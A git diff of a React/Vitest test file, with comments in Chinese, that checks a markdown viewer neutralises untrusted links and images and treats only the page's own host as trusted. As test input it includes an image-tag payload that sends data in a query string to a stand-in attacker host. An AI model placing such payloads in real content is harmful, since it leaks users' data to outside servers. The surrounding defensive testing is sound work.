@@ -1,5 +1,20 @@
+import { createRequire } from "node:module";
 import { render, screen } from "@testing-library/react";
 import { describe, expect, it } from "vitest";
+
+const require = createRequire(import.meta.url);
+
+function setPageUrl(href) {
+  // jsdom 不實作跨來源導覽。改文件的 URL，window.location.hostname 才會跟著變。
+  const { implForWrapper } = require("jsdom/lib/jsdom/living/generated/utils");
+  const whatwgURL = require("whatwg-url");
+  const document = implForWrapper(window.document);
+  const url = whatwgURL.parseURL(href);
+  const previous = whatwgURL.serializeURL(document._URL);
+  document._URL = url;
+  document._origin = whatwgURL.serializeURLOrigin(url);
+  return previous;
+}
 
 import { MarkdownView } from "../markdown.jsx";
 import { AuditWatermark, INJECTION_NOTICE } from "../trust.jsx";
@@ -42,6 +57,30 @@ describe("外連改成純文字", () => {
     expect(isPlatformUrl("blob:https://evil.example/1")).toBe(false);
     const { container } = render(<MarkdownView text={'<img src="//evil.example/?q=資料">'} />);
     expect(container.querySelector("img")).toBeNull();
+  });
+
+  it("頁面自己的主機算平台，別台的實驗 IP 不算", () => {
+    const previous = setPageUrl("https://anila.intranet.example/anila/");
+    try {
+      expect(window.location.hostname).toBe("anila.intranet.example");
+      expect(isPlatformUrl("https://anila.intranet.example/anila/")).toBe(true);
+      expect(isPlatformUrl("http://ANILA.INTRANET.EXAMPLE/app")).toBe(true);
+      expect(isPlatformUrl("/api/ingestion/images/3/blob")).toBe(true);
+      expect(isPlatformUrl("https://anila.ai.ncsist.org.tw/app")).toBe(true);
+      expect(isPlatformUrl("http://10.53.100.12/app")).toBe(false);
+      expect(isPlatformUrl("http://10.53.100.15/app")).toBe(false);
+      expect(isPlatformUrl("http://172.16.120.35/app")).toBe(false);
+      expect(isPlatformUrl("http://172.16.120.153/app")).toBe(false);
+      expect(isPlatformUrl("http://127.0.0.1/app")).toBe(false);
+      expect(isPlatformUrl("http://evil.example/x")).toBe(false);
+      const kept = neutralizeUntrustedMarkdown("![圖](https://anila.intranet.example/a.png)");
+      expect(kept).toContain("![圖](https://anila.intranet.example/a.png)");
+      const dropped = neutralizeUntrustedMarkdown("![x](http://10.53.100.12/a.png)");
+      expect(dropped).not.toContain("![x](");
+      expect(dropped).toContain("10.53.100.12");
+    } finally {
+      setPageUrl(previous);
+    }
   });
 
   it("程式碼圍欄裡的網址留給預覽", () => {
